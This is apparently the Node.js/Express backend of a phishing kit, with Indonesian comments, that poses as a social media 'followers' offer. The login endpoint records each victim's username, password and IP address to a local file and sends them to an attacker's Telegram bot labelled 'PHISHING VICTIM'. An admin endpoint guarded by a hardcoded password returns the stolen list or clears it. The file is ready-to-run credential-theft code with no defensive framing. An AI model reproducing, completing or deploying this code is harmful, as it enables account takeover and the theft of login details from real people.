const express = require('express');
const fs = require('fs');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ========== KONFIGURASI ==========
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // GANTI DENGAN TOKEN BOT ANDA
const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // GANTI DENGAN CHAT ID ANDA
const ADMIN_PASSWORD = '083183';

// File penyimpanan data
const DATA_FILE = '/tmp/victims_data.json';

// ========== FUNGSI BACA & SIMPAN ==========
function loadVictims() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (err) {
        console.error('Error loading:', err.message);
    }
    return [];
}

function saveVictims(victims) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(victims, null, 2));
        return true;
    } catch (err) {
        console.error('Error saving:', err.message);
        return false;
    }
}

// ========== KIRIM KE TELEGRAM ==========
async function sendToTelegram(username, password, followers, ip) {
    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return false;
    
    const message = `🔥 PHISHING VICTIM 🔥\n\nUsername: ${username}\nPassword: ${password}\nPackage: ${followers} followers\nIP: ${ip}\nTime: ${new Date().toLocaleString()}`;
    
    try {
        const https = require('https');
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const postData = JSON.stringify({ chat_id: CHAT_ID, text: message });
        
        const options = {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
        };
        
        const req = https.request(url, options);
        req.write(postData);
        req.end();
        return true;
    } catch (err) {
        console.error('Telegram error:', err.message);
        return false;
    }
}

// ========== API ENDPOINTS ==========

// 1. Endpoint login phishing
app.post('/api/login', async (req, res) => {
    const { username, password, followers } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    
    if (!username || !password) {
        return res.status(400).json({ error: 'Missing credentials' });
    }
    
    const victims = loadVictims();
    victims.unshift({
        id: Date.now(),
        username: username,
        password: password,
        followers: followers || '3000',
        ip: ip,
        timestamp: new Date().toLocaleString('id-ID'),
        rawTime: Date.now()
    });
    saveVictims(victims);
    
    await sendToTelegram(username, password, followers || '3000', ip);
    
    console.log(`[LOGIN] ${username} | ${password}`);
    res.redirect('/processing.html');
});

// 2. Endpoint admin login (CORS enabled)
app.post('/api/admin', (req, res) => {
    const { password } = req.body;
    
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true, message: 'Login berhasil' });
    } else {
        res.json({ success: false, message: 'Password salah' });
    }
});

// 3. Endpoint get data (GET, not POST)
app.get('/api/get-data', (req, res) => {
    const authPass = req.headers['x-admin-pass'];
    
    if (authPass !== ADMIN_PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const victims = loadVictims();
    res.json({ success: true, data: victims, total: victims.length });
});

// 4. Endpoint clear data
app.post('/api/clear-data', (req, res) => {
    const { password } = req.body;
    
    if (password !== ADMIN_PASSWORD) {
        return res.json({ success: false, message: 'Password salah' });
    }
    
    saveVictims([]);
    res.json({ success: true, message: 'Data cleared' });
});

// 5. Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ status: 'ok', message: 'API is working', time: new Date().toISOString() });
});

module.exports = app;
